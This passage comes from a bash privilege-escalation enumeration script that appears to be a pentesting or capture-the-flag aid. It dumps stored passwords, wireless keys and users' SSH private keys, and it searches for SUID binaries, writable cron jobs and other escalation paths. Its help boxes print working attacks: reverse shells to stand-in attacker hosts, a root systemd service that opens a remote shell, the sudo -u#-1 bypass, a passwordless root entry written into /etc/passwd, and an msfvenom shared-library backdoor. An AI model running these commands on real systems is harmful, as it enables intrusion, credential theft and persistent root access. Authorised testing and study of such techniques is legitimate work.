                echo -e "\t║    key4.db                                                                                                         ║"
                echo -e "\t║    logins.json                                                                                                     ║"
                echo -e "\t║Read more about where Firefox stores your bookmarks, passwords and other user data:                                 ║"
                echo -e "\t║    https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data                                    ║"
                echo -e "\t║You can use firefox_decrypt.py tool:                                                                                ║"
                echo -e "\t║    https://github.com/unode/firefox_decrypt                                                                        ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else 
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Passwords in smb.conf file:${XX}"
    cat /etc/samba/smb.conf 2>/dev/null | grep -i 'pass\|cred\|hash' --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Dump cleartext Pre-Shared Wireless Keys:${XX}"
    cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
echo -e "\n${BLUE}╔═════{ Find config.* files 'Excluded /var/ | /usr/':${XX}"
    find / -iname config.* 2> /dev/null | grep -v '/var/\|/usr/' | xargs ls -ld 2>/dev/null
echo -e "\n${BLUE}╔═════{ Any credentials in apache2.conf file:${XX}"
    if [ -f /etc/apache2/apache2.conf ];
        then
        echo -e "\n${BLUE}    ══{ apache2.conf file permission:${XX}"
            ls -la /etc/apache2/apache2.conf
        echo -e "\n${BLUE}    ══{ Reading apache2.conf:${XX}"
            cat /etc/apache2/apache2.conf 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Read the full file for more inofrmation. Look for any password                                                      ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
     		echo -e "${RED}	File does not exist${XX}"
fi
echo -e "\n${BLUE}╔═════{ Configuration files that might contain sensitive information:${XX}"
    grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════════[ System Information ]═════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ System Name:${XX}"
    uname -a 2>/dev/null
echo -e "\n${BLUE}╔═════{ Kernal Exploit supported by linux-exploit-suggester:${XX}"
    . ./linux-exploit-suggester.sh
echo -e "\n${BLUE}╔═════{ System Release:${XX}"
    cat /etc/*-release 2>/dev/null
echo -e "\n${BLUE}╔═════{ Host name:${XX}"
    hostname 2>/dev/null
echo -e "\n${BLUE}╔═════{ System Version:${XX}"
    cat /proc/version
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║The version is not listed in our database. However, make sure to keep your system always up-to-date. Old version are║"
        echo -e "\t║always vulnerable. Visit the link bellow for more details:                                                          ║"
        echo -e "\t║    https://github.com/SecWiki/linux-kernel-exploits                                                                ║"
        echo -e "\t║Or use:                                                                                                             ║"
        echo -e "\t║    searchsploit 'Linux version'                                                                                    ║"
        echo -e "\t║    https://github.com/InteliSecureLabs/Linux_Exploit_Suggester                                                     ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Is sudo version vulnerable?${XX}"
    sudo -V | grep version
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the sudo version ${RED}<= v1.28${XX}, it is exploitable.                                                                    ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║    sudo -u#-1 /bin/bash                                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Available shells:${XX}"
    cat /etc/shells 2>/dev/null
echo -e "\n${BLUE}╔═════{ Bash version:${XX}"
    bash --version | grep version 2>/dev/null
echo -e "\n${BLUE}╔═════{ Check Bash Shellshock Vulnerability:${XX}"
    env x='() { :;}; echo Bash is vulnerable' bash -c 'echo Bash is not vulnerable'
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Other test:                                                                                                         ║"
        echo -e "\t║    https://serverfault.com/questions/631257/how-to-test-if-my-server-is-vulnerable-to-the-shellshock-bug           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ User Environment:${XX}"
    env | grep -w 'LOGNAME\|HOME\|PATH\|SHELL\|PWD\|USER' --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If you have write permissions on any folder inside the PATH variable you may be able to hijack some libraries or    ║"
        echo -e "\t║binaries. Read more:                                                                                                ║"
        echo -e "\t║    https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/                                  ║"
        echo -e "\t║    https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/                   ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Lists block devices (hardrives, memory cards, etc):${XX}"
    lsblk -a
echo -e "\n${BLUE}╔═════{ Lists USB devices:${XX}"
    lsusb 2>/dev/null
echo -e "\n${BLUE}╔═════{ Information about SATA Devices for /dev/sda1:${XX}"
    hdparm /dev/sda1 2>/dev/null
echo -e "\n${BLUE}╔═════{ Linux File System Information:${XX}"
    fdisk -l 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Run fdisk -l to list the hosts disks. Then do the following:                                                        ║"
        echo -e "\t║    mkdir /mnt/own                                                                                                  ║"
        echo -e "\t║    mount /dev/sda1 /mnt/own                                                                                        ║"
        echo -e "\t║    cd /mnt/own                                                                                                     ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ List of running services:${XX}"
    service --status-all
echo -e "\n${BLUE}╔═════{ File-systems mounted:${XX}"
    df -h 2>/dev/null
echo -e "\n${BLUE}╔═════{ ASLR Settings:${XX}"
    cat /proc/sys/kernel/randomize_va_space
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Valid Settings:                                                                               ║"
        echo -e "\t║    0 = Disablabed                                                                            ║"
        echo -e "\t║    1 = Conservative Randomization                                                            ║"
        echo -e "\t║    2 = Full Randomization                                                                    ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ ASLR Address Space:${XX}"
    ldd /bin/bash
echo -e "\n${BLUE}╔═════{ SELinux status:${XX}"
    sestatus 2>/dev/null
echo -e "\n${BLUE}╔═════{ Abusing systemctl:${XX}"
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Create NewRCE.service and write:                                                              ║"
        echo -e "\t║    [Unit]                                                                                    ║"
        echo -e "\t║    Description=rooooot                                                                       ║"
        echo -e "\t║    [Service]                                                                                 ║"
        echo -e "\t║    Type=simple                                                                               ║"
        echo -e "\t║    User=root                                                                                 ║"
        echo -e "\t║    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/a.a.a.a/80 0>&1'                              ║"
        echo -e "\t║    [Install]                                                                                 ║"
        echo -e "\t║    wantedBy=multi-user.target                                                                ║"
        echo -e "\t║Open listener on your machine                                                                 ║"
        echo -e "\t║    nc -nlvp 80                                                                               ║"
        echo -e "\t║On Victim Machine:                                                                            ║"
        echo -e "\t║    systemctl enable /tmp/NewRCE.service                                                      ║"
        echo -e "\t║    systemctl start NewRCE                                                                    ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Total number of installed packages:${XX}"
    apt list --installed | wc -l 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║You can display all installed packages by doing:                                                                    ║"
        echo -e "\t║    apt list --installed                                                                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\tEnumeration on progress ╔══════════════════.................(20%).....................................${XX}\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ══════════════════════════════════════════[ System Date/Time ]══════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ System Up Time:${XX}"
    uptime | sed -E 's/^[^,]*up *//; s/, *[[:digit:]]* users.*//; s/min/minutes/; s/([[:digit:]]+):0?([[:digit:]]+)/\1 hours, \2 minutes/'
echo -e "\n${BLUE}╔═════{ System Date:${XX}"
    date 2>/dev/null
echo -e "\n${BLUE}╔═════{ CPU Information:${XX}"
    lscpu 2>/dev/null
echo -e "\n${BLUE}╔═════{ System Timer List:${XX}"
    systemctl list-timers --all 2>/dev/null & sleep 5 ; kill $!
echo -e "\n${BLUE}╔═════{ backuperer.timer:${XX}"
    systemctl list-timers --all | grep backuperer.timer 2>/dev/null & sleep 5 ; kill $!
echo -e "\n${BLUE}    ══{ backuperer.timer location:${XX}"
        locate backupere.timer
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html                                                              ║"
        echo -e "\t║https://steflan-security.com/hack-the-box-tartarsauce-walkthrough/                                                  ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ════════════════════════════════════════════[ System SUID ]═════════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}    ══{ What is SUID/SGID?${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║SUID (Set User ID) & SGIDs (Set Group ID) executables are those that execute with the permission of the owner (SUID)║"
        echo -e "\t║or group (SGID). You can identify SUID and SGIDs by a representative 's' in the execute permission field the file:  ║"
        echo -e "\t║-rwsr-sr-x can often be exploit to gain root privilege.                                                             ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Find capability files:${XX}"
    getcap -r / 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Capability files are different from system to another system. Googling them my revile a way of how to exploit them. ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Capability with setui+ep:${XX}"
    getcap -r / 2>/dev/null | grep cap_setuid+ep
echo -e "\n${BLUE}╔═════{ Built-in Binaries:${XX}"
		echo -e "\t/usr/sbin/pppd                    |  /usr/sbin/exim4"
		echo -e "\t/usr/bin/ntfs-3g                  |  /usr/bin/chsh"
		echo -e "\t/usr/bin/su                       |  /usr/bin/chfn"
		echo -e "\t/usr/bin/mount                    |  /usr/bin/sudo"
		echo -e "\t/usr/bin/umount                   |  /usr/bin/pkexec"
		echo -e "\t/usr/bin/passwd                   |  /usr/bin/newgrp"
		echo -e "\t/usr/bin/gpasswd                  |  /usr/bin/fusermount"
		echo -e "\t/usr/sbin/mount.nfs               |  /usr/sbin/mount.cifs"
		echo -e "\t/usr/lib/xorg/Xorg.wrap           |  /usr/lib/openssh/ssh-keysign"
		echo -e "\t/usr/lib/chromium/chrome-sandbox  |  /usr/libexec/polkit-agent-helper-1"
		echo -e "\t/usr/bin/vmware-user-suid-wrapper |  /usr/lib/dbus-1.0/dbus-daemon-launch-helper"
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Most linux system have these Binaries, and they are built-in, no escalation   ║"
        echo -e "\t║is done by them unless file permission has been change.                       ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Finding System SUID:${XX}"
    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always
echo -e "\n${BLUE}╔═════{ SUID not built-in (Supper Interesting :D)${XX}"
    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always | grep -v pppd | grep -v exim4 | grep -v ntfs-3g | grep -v chsh | grep -v su | grep -v chfn | grep -v mount | grep -v sudo | grep -v umount | grep -v pkexec | grep -v passwd | grep -v newgrp | grep -v gpasswd | grep -v fusermount | grep -v mount.nfs | grep -v mount.cifs | grep -v Xorg.wrap | grep -v ssh-keysign | grep -v chrome-sandbox | grep -v polkit-agent-helper-1 | grep -v vmware-user-suid-wrapper | grep -v dbus-daemon-launch-helper
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary   ║"
        echo -e "\t║permissions to a user to run the program/file with the permission of the file owner rather than the user who runs it║"
        echo -e "\t║When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID):                                             ║"
        echo -e "\t║-rw${RED}x${XX}                -rwx     -rwx                                                                                   ║"
        echo -e "\t║SUID                                                                                                                ║"
        echo -e "\t║-rw${RED}s${XX}                                                                                                                ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║    https://gtfobins.github.io/                                                                                     ║"
        echo -e "\t║    https://mil0.io/linux-privesc/                                                                                  ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Finding System SGID (execute as the group):${XX}"
    find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║When bit “2” is set to group it becomes SGID (Set Group ID):                                                        ║"
        echo -e "\t║-rwx     -rw${RED}x${XX}                -rwx                                                                                   ║"
        echo -e "\t║         SGID                                                                                                       ║"
        echo -e "\t║         -rw${RED}s${XX}                                                                                                       ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║    https://gtfobins.github.io/                                                                                     ║"
        echo -e "\t║    https://mil0.io/linux-privesc/                                                                                  ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Find sticky-bit binaries:${XX}"
    find / -type d -perm -1000 -exec ls -ld --color=always {} \; 2>/dev/null
echo -e "\n${BLUE}╔═════{ World writable scripts invoked as root:${XX}"
echo -e "\n${RED}Run this command manually: find / -writable -type f 2>/dev/null | xargs ls -la${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If you find a script that is owned by root but is writable by anyone, you can add your own malicious code into it & ║"
        echo -e "\t║it will escalate your privileges when the script runs as root.                                                      ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║    bash: echo 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' >> file                                     ║"
        echo -e "\t║    netcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file                                              ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ World writable directories:${XX}"
    find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null
echo -e "\n${BLUE}╔═════{ World executable folders:${XX}"
    find / -perm o=x -type d 2>/dev/null
echo -e "\n${BLUE}╔═════{ Writable config files:${XX}"
    find /etc/ -writable -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ How Files Can Be Upload/Download:${XX}"
    which wget nc netcat socat python python2 python3 ftp tftp ssh smb | xargs ls -la --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Some of them my have file misconfiguration and my lead to user escalation. File Transfer Cheatsheet: Windows & Linux║"
        echo -e "\t║    https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Unexpected commands allows you to read and/or write files or even execute command:${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║sudo awk 'BEGIN {system('/bin/sh')}'                                                                                ║"
        echo -e "\t║sudo find /etc -exec sh -i \;                                                                                       ║"
        echo -e "\t║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                                                                ║"
        echo -e "\t║sudo tar c a.tar -I ./runme.sh a                                                                                    ║"
        echo -e "\t║ftp>!/bin/sh                                                                                                        ║"
        echo -e "\t║less>! <shell_comand>                                                                                               ║"
        echo -e "\t║                                Give it a try                                                                       ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Profile files:${XX}"
    ls -la /etc/profile --color=always
echo -e "\n${BLUE}╔═════{ Profile.d files:${XX}"
    ls -la /etc/profile.d/ --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║The file /etc/profile and the files under /etc/profile.d/ are scripts that are executed when a user run a new shell.║"
        echo -e "\t║Therefore, if you can write or modify any of the files, you can escalate your privilege.                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Is the .bashrc file writable?${XX}"
    ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la --color=always; find / -iname .bashrc -xdev 2>/dev/null | xargs ls -la --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If so, malicious commands can be written to it and will be executed when the user/root logs in.                     ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\tEnumeration on progress ╔═══════════════════════════════════(50%).....................................${XX}\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════[ System Process and Services ]════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Have a look to what processes are being executed and check if any process has more privileges than it should.       ║"
        echo -e "\t║You can also use a tool called psyp.                                                                                ║"
        echo -e "\t║    https://github.com/DominicBreuker/pspy                                                                          ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Running Proccess on the system:${XX}"
    ps aux 
echo -e "\n${BLUE}╔═════{ Running Proccess as root:${XX}"
    ps aux | grep --color=always root
echo -e "\n${BLUE}╔═════{ Running Proccess as current user:${XX}"
    ps aux | grep --color=always $USER
echo -e "\n${BLUE}╔═════{ Process binaries and associated permissions:${XX}"
    ps aux 2>/dev/null | awk '{print $11}'| xargs -r ls -la 2>/dev/null | awk '!x[$0]++' 2>/dev/null
echo -e "\n${BLUE}╔═════{ Is tmux Running as root:${XX}"
    ps aux | grep tmux --color=always 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║ls -l /path on the proccess                                                                                         ║"
        echo -e "\t║tmux -S /path on the proccess                                                                                       ║"
        echo -e "\t║https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-valentine/                ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Node.js Running on the system:${XX}"
    ps aux | grep --color=always .js 2>/dev/null
echo -e "\n${BLUE}╔═════{ Is VNC running on the system:${XX}"
    ps -auwwx | grep vnc
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║:1 - display number 1                                                                                               ║"
        echo -e "\t║-rfbauth {PATH} - specifies the file containing the password used to auth viewers                                   ║"
        echo -e "\t║-rfbport {PORT} - tells us which port to connect to                                                                 ║"
        echo -e "\t║ocalhost - only listen locally                                                                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Are service config files readable/wreitable by current user:${XX}"
    find /etc/init.d/ -uid 0 -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Shared object libraries (GOOD FOR BACKDOOR):${XX}"
        if [ -f /usr/local/bin/program ]; 
            then
                ldd /usr/local/bin/program 2>/dev/null
            else
                echo -e "  ${RED}File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Is the executable compiled with RPATH or RUNPATH (GOOD FOR BACKDOOR):${XX}"
    objdump -x /usr/local/bin/program 2>/dev/null | grep -i "RPATH\|RUNPATH"
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If any executable is found, create the backdoor using any payload you wich, using the same file name found.           ║"
        echo -e "\t║For Example:                                                                                                          ║"
        echo -e "\t║Create payload using msfvenome:                                                                                       ║"
        echo -e "\t║    msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker LPORT> -f elf-so -o FILENAME.so║"
        echo -e "\t║Then send the file to the same directory, configure a Metasploit listener with the same payloadlunch and wait for     ║"
        echo -e "\t║the program to be launched by a user with elevated privileges.                                                        ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════[ System Path Scheduled Tasks ]════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ Current User Crontab:${XX}"
    crontab -l
echo -e "\n${BLUE}╔═════{ Find World-Writable Cron jobs:${XX}"
    find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
echo -e "\n${BLUE}╔═════{ Other User Crontab [It may need root]:${XX}"
    cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If you have the root/user password, try to run the command manually:                                                ║"
        echo -e "\t║    cut -d ':' -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null                                               ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Scheduled Jobs:${XX}"
    cat /etc/crontab 2>/dev/null
        echo -e "\t╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the file is running by root, & ${RED}writable to anyone${XX}, the attacker my replace the content of the file.               ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                             ║"
        echo -e "\t║    echo '/bin/sh' >> file                                                                                           ║"
        echo -e "\t║    echo '/bin/bash' >> file                                                                                         ║"
        echo -e "\t║    echo 'bash -i >& /dev/tcp/a.a.a.a/4242 0>&1' >> file                                                             ║"
        echo -e "\t║    echo 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 80 >/tmp/f' >> file                           ║"
        echo -e "\t║    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file                                                        ║"
        echo -e "\t║    echo 'echo root::0:0:root:/root:/bin/bash >> /etc/passwd' >> file                                                ║"
        echo -e "\t║    From attacker PC: msfvenom -p cmd/unix/reverse_python lhost=a.a.a.a lport=80 (echo it to the file)               ║"
        echo -e "\t║    You can use any Reverse Shell payload from payloadallthethings in GitHub                                         ║"
        echo -e "\t╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════[ Communications & Networking ]════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ Host public IP Address:${XX}"
    dig +short myip.opendns.com @resolver1.opendns.com 2>/dev/null
echo -e "\n${BLUE}╔═════{ Basic Network Details:${XX}"
    ifconfig | grep -v "ether\|loop\|TX\|RX"
echo -e "\n${BLUE}╔═════{ Default Gatway:${XX}"
    route 2>/dev/null
echo -e "\n${BLUE}╔═════{ Full Network Details:${XX}"
    ifconfig
echo -e "\n${BLUE}╔═════{ Firewall Rulls:${XX}"
    iptables -nvL 2>/dev/null
echo -e "\n${BLUE}╔═════{ Other users & hosts are communicating with the system:${XX}"
    lsof -i
echo -e "\n${BLUE}╔═════{ Open Ports:${XX}"
    netstat -tulpna
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Are there any open ports on localhost we did not see when we were doing nmap? This might need tunneling or connecting ║"
        echo -e "\t║to it locally. If nothing is displayed run the command manually: netstat -tulpna                                      ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Network Route & Neighbours:${XX}"
    route; ip n
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Want to know how many hops are between our compromised machine, and other network segments, do the following manually:║"
        echo -e "\t║    traceroute –n <ip address>                                                                                        ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ ARP Cashe:${XX}"
    arp; arp -en | grep -v Address
echo -e "\n${BLUE}╔═════{ Hosts File:${XX}"
    cat /etc/hosts 
echo -e "\n${BLUE}╔═════{ DNS Server:${XX}"
    cat /etc/resolv.conf | grep nameserver
echo -e "\n${BLUE}╔═════{ Outbound port connectivity:${XX}"
    nmap -sT -p4444-4450 portquiz.net 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Knowing this information will come in handy if and when we need to establish outbound connections to other systems  ║"
        echo -e "\t║we control for the purpose of maintaining access or exfiltrating data.                                              ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\tEnumeration on progress ╔═══════════════════════════════════(80%)═════════════════....................${XX}\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═══════════════════════════════════════════[ Finding SSH Keys ]═════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ SSH is configured for Public Key Authentication:${XX}"
    if [ -f /etc/ssh/sshd_config ]; 
	    then
    	    cat /etc/ssh/sshd_config | grep 'PubkeyAuthentication' --color=always 
        else
     		echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Identify any existing public or private keys:${XX}"
    ls -la /$USER /etc/ssh /home/$USER/.ssh/ --color=always 2>/dev/null; cat /home/$USER/.ssh/id_rsa 2>/dev/null; cat /home/$USER/.ssh/id_dsa 2>/dev/null
echo -e "\n${RED}Exploiting Misconfigured SSH Keys${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Secure Shell (SSH) is a cryptographic network protocol which allows users to securely perform a number of network   ║"
        echo -e "\t║services, such as remote authentication or file transfer over an unsecured network. Exploit:                        ║"
        echo -e "\t║    https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ id_rsa:${XX}"
find / -iname id_rsa 2>/dev/null
            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║If anyone have access to any user's id_rsa, he can login to the system using that key.                              ║"
            echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
            echo -e "\t║    scp -P 22 username@v.v.v.v:/path/of/victim_rsa /path/to/attacker                                                ║"
            echo -e "\t║    chmod 0600 id_rsa                                                                                               ║"
            echo -e "\t║    ssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa                                                                      ║"
            echo -e "\t║Read More:                                                                                                          ║"
            echo -e "\t║    https://matt.might.net/articles/ssh-hacks/                                                                      ║"
            echo -e "\t║    https://book.hacktricks.xyz/pentesting/pentesting-ssh                                                           ║"
            echo -e "\t║    https://unix.stackexchange.com/questions/23291/how-to-ssh-to-remote-server-using-a-private-key                  ║"
            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"    
echo -e "\n${BLUE}╔═════{ id_dsa:${XX}"
